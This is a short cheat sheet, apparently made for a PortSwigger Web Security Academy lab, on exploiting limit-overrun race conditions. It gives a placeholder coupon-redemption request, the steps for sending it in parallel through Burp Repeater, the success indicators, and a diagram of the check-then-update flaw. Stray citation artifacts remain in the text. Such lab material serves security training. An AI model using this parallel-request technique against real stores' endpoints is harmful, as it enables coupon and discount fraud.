# Payload 01 – Limit Overrun Race Conditions

## Target Pattern

Single-use or rate-limited endpoint:

```http
POST /cart/coupon
```

---

## Basic Request

```http
POST /cart/coupon HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION
Content-Type: application/x-www-form-urlencoded

csrf=YOUR-CSRF&coupon=YOUR-COUPON
```

---

## Race Strategy

Send the same request multiple times **in parallel**.

```text
Request 1 ───────┐
Request 2 ────────┤
Request 3 ────────┤──→ Race Window
Request 4 ────────┤
Request 5 ────────┘
```

Expected vulnerable behavior:

```text
Request 1 → Coupon applied
Request 2 → Coupon applied
Request 3 → Coupon applied
...
```

Instead of:

```text
Request 1 → Coupon applied
Request 2+ → Coupon already applied
```

---

## Burp Repeater

Create a request group containing multiple copies of:

```http
POST /cart/coupon
```

Then:

```text
Right-click group
        ↓
Send group in parallel
```

The source specifically recommends parallel requests to attempt to apply the coupon multiple times. :contentReference[oaicite:0]{index=0}

---

## Key Indicator

Look for multiple successful responses containing the equivalent of:

```text
Coupon applied successfully
```

---

## Vulnerability Pattern

```text
CHECK
  ↓
Is coupon unused?
  ↓
YES
  ↓
RACE WINDOW
  ↓
Apply discount
  ↓
Mark coupon as used
```

The race exists because the state update happens after the validation. :contentReference[oaicite:1]{index=1}